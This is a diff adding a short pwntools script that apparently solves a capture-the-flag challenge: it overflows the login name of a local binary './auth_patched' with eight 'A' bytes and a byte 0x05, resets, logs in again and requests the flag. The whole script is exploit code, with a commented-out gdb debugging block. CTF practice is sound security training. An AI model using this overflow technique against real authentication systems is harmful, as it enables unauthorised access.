@@ -1,0 +1,22 @@
+from pwn import *
+
+e = ELF("./auth_patched")
+libc = ELF("./libc-2.23.so")
+ld = ELF("./ld-2.23.so")
+
+p = process("./auth_patched")
+'''
+p = gdb.debug("./auth_patched", gdbscript = 
+b *main
+b *0x400C0C
+b *0x400C45
+b *0x400D89
+)
+'''
+
+p.sendlineafter(b"> ", b"login " +  b"A" * 0x8 + p8(5))
+p.sendlineafter(b"> ", b"reset")
+p.sendlineafter(b"> ", b"login vani")
+p.sendlineafter(b"> ", b"get-flag")
+
+p.interactive()
